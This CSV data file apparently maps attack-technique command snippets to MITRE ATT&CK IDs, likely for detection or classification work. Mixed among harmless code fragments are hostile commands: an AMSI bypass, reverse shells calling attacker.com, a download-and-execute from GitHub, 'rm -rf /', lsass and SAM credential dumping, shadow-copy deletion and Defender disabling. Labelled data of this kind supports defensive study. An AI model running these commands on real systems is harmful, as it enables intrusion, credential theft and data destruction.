command,mitre_id
enabled = true,T1059
"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",T1562
"cp ""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt"" /tmp/",T1110
$Users | Foreach-Object {,T1110
match keys,T1546
"Start-Process ""$script_path""",T1059
"public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);",T1562
"Write-Output ""Found table: $($table)""",T1619
defaults,T1037
reg add HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY /d 72656463616e617279 /f,T1112
"rundll32.exe url.dll,OpenURL ""PathToAtomicsFolder\T1218.011\src\index.hta""",T1218
busybox httpd -f -p 12345 -h .,T1105
do {,T1539
EhStorAurhn.exe,T1055
"echo ""# THIS IS A COMMENT"" >> /etc/ufw/sysctl.conf",T1562
System.DirectoryServices,T1069
for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/$host/$port) && echo port $port is open ; done,T1046
Set-AADIntUserMFA,T1556
defaults write com.apple.finder AppleShowAllFiles YES,T1564
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f",T1546
ushata.exe,T1574
C:\Temp\TrustedInstaller.exe,T1036
killall Terminal,T1548
"write-host ""Remote download of SharpHound.ps1 into memory, followed by execution of the script"" -ForegroundColor Cyan",T1059
sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf,T1562
XMPP,T1071
$PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe -debug,T1055
libpcap,T1205
ProxyServer,T1016
HKLM\SECURITY\Policy\PolEKList\default,T1003
last -a -f /path/to/input-file,T1005
"Invoke-MSOLSpray -UserList ""$user_list"" -Password ""$password""",T1110
get-addefaultdomainpasswordpolicy,T1201
takeown /F,T1222
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders,T1060
"if (test-path ""$exfil_folder"") {} else {new-item -path ""$env:temp"" -Name ""T1555.003"" -ItemType ""directory"" -force}",T1555
"""$Path_to_file"" 1>NUL",T1105
launchctl start,T1569
NtCurrentPeb,T1106
"@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:""%userdomain%\%n"" ""$password"" 1>NUL 2>&1 && @echo [*] %n:$password && @net use /delete %logonserver%\IPC$ > NUL",T1110
codex sandbox linux /bin/sh,T1059
CreateProcessA(),T1106
Get-RegistryAutoLogon,T1552
AdjustTokenPrivileges(),T1134
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f,T1112
"Set-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Value ""0,0,0,0""",T1547
"ss.TCPServer(("""", 12345), s.SimpleHTTPRequestHandler).serve_forever()'",T1105
WoodySharpExecutor,T1105
Get-NetTCPConnection,T1049
icacls,T1222
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SpynetReporting"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
xwud -in $output_file,T1113
IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd ),T1546
com.apple.metadata:_kMDItemUserTags,T1564
"VSIISExeLauncher.exe -p {PATH:.exe} -a ""{CMD:args}""",T1218
HKLM\SOFTWARE\Microsoft\Print\Components\,T1027
ExitProcess,T1106
FromBase64String,T1140
import -window root $output_file,T1113
.git,T1564
ufw logging off,T1562
"New-ItemProperty $ExcelRegPath ""Autoload"" -value ""1"" -propertyType DWORD | Out-Null",T1137
"Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""",T1059
tic -C /path/to/input-file,T1005
chattr +i /path/to/input-file,T1548
"cmd.exe /c ""$env:temp\psexec.exe -accepteula \\$targethost cmd.exe /c echo ""--access-token""""",T1569
"""$gup_executable""",T1574
sftp,T1105
while true do,T1059
journalctl,T1548
parted,T1680
"REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d ""$script_path"" /f",T1037
cd PathToAtomicsFolder/T1567.002/src/,T1567
move,T1570
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UIF2IS20VK,T1547
winget,T1105
/etc/zshenv,T1156
ADMIN$,T1021
pm.sh,T1059
cp /bin/sh /path/to/temp-dir/bin/rustc,T1059
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL},T1105
Set-CASMailbox,T1098
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDrives.lnk,T1547
echo Tickets after requesting SYSVOL:,T1558
<MappedFolder>,T1564
"if [ $(echo $HISTSIZE) -eq 0 ]; then echo ""\$HISTSIZE is zero""; else HIST_LENGTH=$(wc -l $HISTFILE); echo ""\$HISTSIZE is not zero, history size is $HIST_LENGTH""; fi",T1562
"kldstat | grep -i ""vmm""",T1082
pw unlock art,T1078
check_log -F /path/to/input-file -O /path/to/output-file,T1222
cat /etc/shells,T1059
echo DATA | tee /path/to/output-file,T1222
dscl . -append /Groups/admin GroupMembership AtomicUser,T1078
pdftex --shell-escape '\write18{/bin/sh}\end',T1059
clear logging,T1070
"socat -u 'exec:echo DATA' open:/path/to/output-file,creat",T1222
python3 $lazagne_path/laZagne.py $specific_module >> $output_file,T1555
SIGINT,T1564
dmidecode --no-sysfs -d x.dmi --dump-bin /path/to/output-file,T1222
echo 1q2w3e4r>> passwords.txt,T1110
"puppet apply -e ""exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }""",T1059
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll},T1218
$EncodedCommand,T1027
",p",T1005
Get-SiteListPassword,T1552
foreach($fileShare in $fileShares) {,T1619
foreach ($Computer in $Computers) {,T1018
Write-Host $_.Exception.Message,T1110
mysql -e '\! /bin/sh',T1059
KernelCallbackTable,T1574
"ruby -e 'require ""open-uri""; download = URI.open(""http://attacker.com/path/to/input-file""); IO.copy_stream(download, ""/path/to/output-file"")'",T1105
SYSTEM\CurrentControlSet\Services,T1489
Set-LocalUser,T1531
HKLM\SYSTEM\CurrentControlSet\Services,T1574
bcrypt,T1573
Dim applicationPath As String,T1137
"Remove-BlankFiles -OutputDirectory ""$output_directory""",T1526
LaunchDaemons,T1543
sc query type=service > %TEMP%\T1119_1.txt,T1119
$which_openssl rsa -in $private_key_path -pubout -out $public_key_path,T1486
"Write-Host ""Waiting 5s before putting $processName in the comma"" -ForegroundColor Yellow",T1562
rwdsk,T1070
rotate,T1140
cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f,T1112
xattr -l,T1564
"Write-Host ""Directory $dest_path already exists."" }",T1218
powershell.exe,T1059
"echo ""runnning some commands to populate the history""",T1562
supportaccount,T1036
torify /bin/sh,T1059
"WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY)",T1018
Winpcap,T1205
zip -r $input_folder/$input_file.zip $input_folder,T1560
grep,T1518
HKCU\Software\Microsoft\Office\,T1112
net.exe user,T1087
VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe},T1127
catch{ $_; exit $_.Exception.Response.StatusCode.Value__},T1003
Invoke-SessionGopher,T1552
"Copy-Item ""$dll_path"" C:\Users\Public\AtomicTest.dll -Force",T1546
attrib.exe +h $file_or_folder\T1222.001_attrib1.txt,T1222
pluginconfpath=/path/to/temp-dir/,T1548
scp $username@$remote_host:$remote_file $local_path,T1105
poetry run python /path/to/temp-file,T1548
icacls C:\Windows\System32\DisplaySwitch.exe /grant Administrators:F /t,T1546
cat ~/Library/Keychains/login.keychain-db > $keychain_export,T1555
while(pe.available()>0)so.write(pe.read());,T1059
"msedge.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",T1218
if (Test-Path $edgePath64) {,T1218
openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file,T1105
NTUSER.log,T1059
sudo vim /etc/sudoers,T1548
mkdir /path/to/temp-dir/lib/,T1059
shutdown,T1529
shareenumeration -noninteractive -consoleoutput,T1135
free && echo 3 > /proc/sys/vm/drop_caches && free,T1562
"ssh localhost ""{CMD}""",T1202
strace -o /dev/null /bin/sh,T1059
"echo ""dn: cn=Atomic User, cn=Users,dc=$domain,dc=$top_level_domain\nobjectClass: person\ncn: Atomic User\nsn: User"" > tempadmin.ldif",T1136
if ($ActualOutput -ne $ExpectedOutput) {,T1218
G$RADIUSCHAP,T1556
config set dbfilename output-file,T1222
AppData,T1485
enum,T1083
PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder},T1564
ren %APPDATA%\amsi.dll WinAppXRT.dll,T1574
HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID},T1553
rd /S,T1070
procdump -ma lsass.exe lsass_dump,T1003
tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@,T1222
echo URL=C:\windows\system32\calc.exe >> $shortcut_file_path,T1547
"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(""attacker.com"",12345);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'",T1059
GUP.exe,T1036
"awk 'BEGIN {system(""/bin/sh &"")}'",T1059
"jrunscript -e 'var host=""attacker.com"";",T1059
"C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}",T1053
IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd ),T1546
SOFTWARE\MICROSOFT\Windows NT\ CurrentVersion | ProductName,T1012
"reg add ""HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters"" /v ServiceDll /t REG_EXPAND_SZ /d ""%systemroot%\system32\w64time.dll"" /f",T1543
%SystemRoot%\Temp\lsass.exe /B,T1036
"$sheet.Cells.Item(11,1) = ""=FWRITELN(A5, `""If winHttp.Status = 200 Then`"")""",T1204
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices,T1012
$LANG,T1614
"perl -le ""use MIME::Base64;print(decode_base64('$ENCODED'));""",T1140
"$sheet.Cells.Item(3,1) = ""atomic_redteam_x4m_exec.vbs""",T1204
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1547
msiexec /i $installer /qn,T1219
vssadmin.exe delete shadows /all /quiet,T1490
/failure,T1562
pushd $destination_path,T1105
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f",T1490
"echo ""password123"" | pw usermod art -h 0",T1110
C:\unsafe path with space\program.exe,T1574
Stop-Process -processname notepad,T1055
sc start sshd,T1569
"Invoke-Maldoc -macroCode ""$macro"" -officeProduct ""Word"" -sub ""Extract"" -NoWrap",T1564
tsc /path/to/input-file.ts --outFile /path/to/output-file,T1222
mpnotify.exe,T1556
"perl -e 'exec ""/bin/sh""'",T1059
COR_ENABLE_PROFILING,T1574
put /path/to/input-file,T1105
"if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u",T1105
rd /s /q %systemdrive%\$RECYCLE.BIN,T1070
clang $input_file && ./a.out,T1027
Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue,T1098
"Write-Host(""Cannot download $url"")",T1491
ConfigSecurityPolicy.exe {REMOTEURL},T1105
echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4,T1059
"setspn.exe -T $domain_name -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }",T1558
takeown /F C:\Windows\System32\sethc.exe /A,T1546
sudo $MimiPenguin_Location > $output_file,T1003
"if [ -f ""/etc/syslog-ng/$syslog_ng_config_file_name"" ];",T1562
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f",T1112
"schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""",T1053
"echo ""\$PROMPT_COMMAND=$PROMPT_COMMAND""",T1056
wfc.exe {PATH_ABSOLUTE:.xoml},T1127
C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe,T1036
Get-Content $env:TEMP\silver.txt,T1558
./sh -p,T1548
sudo cp $path_startup_params /Library/StartupItems/StartupParameters.plist,T1037
"Get-ChildItem -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\"" | findstr Windows",T1012
"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' >/path/to/temp-file",T1059
/usr/bin/osascript,T1059
WNetAddConnection2W,T1106
sessionGopher -noninteractive -consoleoutput,T1552
dscl . -create /Users/$username NFSHomeDirectory /Users/$username,T1136
ESTCommon.dll,T1036
expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat},T1105
"[ ""$(uname)"" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null",T1070
rundll32.exe -sta {CLSID},T1218
~/.bash_logout,T1156
ping -n 4 $ping_target,T1016
CreateProcessWithLoginW,T1546
%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom,T1546
com.random.name.plist,T1543
public struct TOKEN_PRIVILEGES {,T1562
cmd /c $venv_path\Scripts\python.exe $Firepwd_Path -d $PasswordDBLocation > $Out_Filepath,T1555
"ls -la ""$SITE_PACKAGES/atomic_hook.pth""",T1546
WMI,T1021
"$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()",T1539
"ls ""$env:TEMP\$target_hivevss$_"" -ErrorAction Ignore",T1003
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAPower /t REG_DWORD /d 1 /f",T1112
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore,T1562
/etc/rc.d/init.d,T1037
"Get-AzDomainInfo -folder $output_directory -subscription ""$subscription_name"" -verbose",T1526
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFileMenu /t REG_DWORD /d 1 /f",T1112
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""DisableBlockAtFirstSeen"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
<memory unit='KiB'>1</memory>,T1059
echo $ENCODED > $encoded_file && xxd -r -p < $encoded_file,T1140
gdb -nx -ex 'python ...' -ex quit,T1548
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated,T1012
sudo touch /private/var/db/emondClients/$empty_file,T1543
HKEY_CURRENT_USER\Software\DC3_FEXEC,T1112
wind0ws,T1547
"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\"""" | sudo tee -a /etc/init.d/T1543.002",T1543
OINFO12.OCX,T1574
sql.net4.exe,T1119
"Invoke-MalDoc -macroCode $macrocode -officeProduct ""$ms_product""",T1204
"echo ""[*] Listing SysV init scripts (/etc/init.d):""",T1007
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'),T1555
cat /etc/group,T1069
"Copy-Item -path ""$payload"" -destination ""$new_startup_folder""",T1547
var port=12345;,T1059
$requiredResourcesAccess.Add($requiredGraphAccess),T1098
cmd /c systeminfo > %temp%\ temp.ini,T1082
Set-ItemProperty -Force -Path $registry_key_storage -Name $registry_entry_storage -Value $EncodedCommand,T1027
lwp-download file:///path/to/temp-file /path/to/output-file,T1222
querySpn.vbs,T1087
GetProcAddress(),T1027
hmacTime,T1140
ieinstal.exe,T1548
curl -O $remote_url/gta.db,T1005
"Invoke-Expression ""$input_file""",T1027
netsh interface show interface,T1016
"Get-ChildItem ""$file_path"" | % { $_.CreationTime = ""$target_date_time"" }",T1070
"php -r '$h=@popen(""/bin/sh -i"",""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'",T1059
AlphaZawgyl_font.exe,T1036
java Shell,T1059
New-Item -Path $teamviewer_log_file -Force | Out-Null,T1070
type = s3,T1567
dscl,T1564
C:\Windows\Microsoft.NET\,T1083
/tmp/.temp.data,T1074
fastfetch -c /path/to/temp-file.jsonc,T1059
aws ec2 describe-security-groups --profile $aws_profile --output $output_format,T1580
regasm.exe /U {PATH:.dll},T1218
chmod 2775,T1548
fzf --listen=12345,T1059
echo 'esyscmd(/path/to/command)' | m4,T1059
"rundll32 advpack.dll, RegisterOCX {CMD}",T1218
"if (-not (Test-Path -Path ""$output_folder"")) {",T1530
"cd /tmp && zip -P ""$zip_password"" art_encrypted.zip art_payload.sh",T1027
"rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr",T1218
~/.zshrc,T1546
msxsl.exe script[.]xsl script[.]xsl,T1220
cat /path/to/temp-file,T1005
"%LOCALAPPDATA:~-3,1%md /c echo $input_message > $output_file & type $output_file",T1059
C:\Program Files\Common Files\System\Ole DB\,T1074
ar p /path/to/output-file,T1005
basez /path/to/input-file | basez --decode,T1005
dsajdhas.0,T1480
DefaultAccount,T1036
echo -e 'x\nx' | passwd,T1548
"hh.exe -decompile %temp% ""$local_chm_file""",T1218
"if [ -f ""/etc/$syslog_config_file_name"" ];",T1562
"Invoke-dpsLight ""$password"" $env:Temp\usersdpsLight.txt",T1110
EnumServicesStatusExW(),T1007
"Write-Output ""Found blob: $($blob)""",T1619
msbuild.exe {PATH:.xml},T1127
GetPublicAccessBlock,T1580
"IntelliTrace.exe launch /cp:""collectionplan.xml"" /f:""c:\users\public\log"" ""C:\Windows\System32\calc.exe""",T1127
gtester DATA -o /path/to/output-file,T1222
"reg save hklm\sam, reg save hklm\system,",T1003
lxc start x,T1059
powershell.exe -e $obfuscated_code,T1059
"wmic.exe /node:""192.168.0.1"" process call create ""{CMD}""",T1218
enabled=1,T1548
lwp-download file:///path/to/input-file /path/to/output-file,T1222
ExampleFunctionW,T1218
.jam,T1127
GetProcessById,T1106
"Get-VMHostService -VMHost $vm_host | Where-Object {$_.Key -eq ""TSM-SSH"" } | Start-VMHostService -Confirm:$false",T1021
"Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter ""Name = 'svchost.exe' AND CommandLine LIKE '%'"" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath $file_path -CommandLine '$command_line'",T1134
G$MSRADIUSCHAPKEY,T1556
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f",T1547
DirectoryList,T1083
chmod $numeric_mode $file_or_folder,T1222
"New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableInternetFilesInPV"" -Value ""1"" -PropertyType ""Dword""",T1562
@exec /bin/sh,T1059
"devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",T1127
"Write-Host ""Registry key not found. Make sure the 'TermService\Parameters' key exists.""",T1505
echo '...' >setup.py,T1548
sitecustomize.py,T1546
"Write-Host ""executing eventvwr.msc"" -ForegroundColor Cyan",T1574
auditpol /clear /y,T1562
Set-ExecutionPolicy -Scope Process Bypass -Force,T1134
screen -L /path/to/output-file echo DATA,T1222
VNC,T1219
"mshta.exe javascript:a=GetObject(""script:{REMOTEURL:.sct}"").Exec();close();",T1218
catch {,T1098
Invoke-ShareFinder $parameters,T1135
if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;,T1497
AnyDesk,T1219
$env:COR_PROFILER = '$clsid_guid',T1574
DATA,T1222
"Invoke-Expression ""$adrecon_path""",T1087
"Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"" -Name ""TamperProtection"" -Value 0",T1562
"start-service -Name ""$service_name"" -erroraction silentlycontinue | out-null",T1543
open,T1059
sudo kextunload $module_path,T1547
IFileOperation,T1564
/tmp/data/root/dev,T1083
sudo insmod $module_path,T1547
"C:\Windows\system32\cmd.exe /c ""mshta.exe javascript:a=GetObject('script:$url').Exec();close()""",T1059
